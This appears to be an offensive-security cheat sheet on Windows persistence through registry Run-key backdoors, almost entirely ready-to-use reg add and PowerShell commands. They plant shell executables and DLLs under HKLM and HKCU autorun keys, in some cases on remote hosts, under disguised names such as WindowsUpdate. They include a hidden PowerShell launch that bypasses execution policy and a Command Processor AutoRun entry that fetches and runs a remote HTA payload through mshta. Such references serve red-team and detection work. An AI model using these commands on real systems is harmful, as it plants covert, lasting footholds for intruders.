# Living off the Land

## 01 - Registry Backdoors

### 1.1 - HKLM

#### 1.1.1 - Add Registry Key Syntax

- Command Prompt

```
C\> reg import file.reg

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <value> /t reg_sz /d "rundll32.exe C:\path\to\shell.dll,ExecDLL" /f
```

- Powershell

```powershell
PS C:\> Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "<value>" -PropertyType String -Value "C:\path\to\shell.exe" -Force
```

#### 1.1.2 - Delete Registry Key Syntax

```
C:\> reg del [\\<IP>\]hklm\\software\\microsoft\\currentversion\\run /v <value> /f
```

## Registry Paths List

```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

### HKLM

```
C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Autorun /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v UpdateOnce /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices /v WindowsService /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce /v UpdateSVC /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 /v Autorun /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v Dependency /t REG_SZ /d "C:\path\to\shell.dll"
```

### HKCU

```
C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Image /t REG_SZ /d "powershell.exe -ep bypass -w hidden -nologo -NonI -f C:\path\to\shell.ps1" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v WindowsUpdate /t REG_SZ /d "rundll32.exe C:\path\to\shell.dll,ExecuteShell" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add [\\<IP>\]HKCU\SOFTWARE\Microsoft\Command Processor /v AutoRun /t REG_SZ /d "powershell.exe Start-Process -windowstyle hidden -FilePath mshta.exe http://<IP>/shell.hta" /f
```

---
## References

- [[Windows Post Exploitation Persistence References]]

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)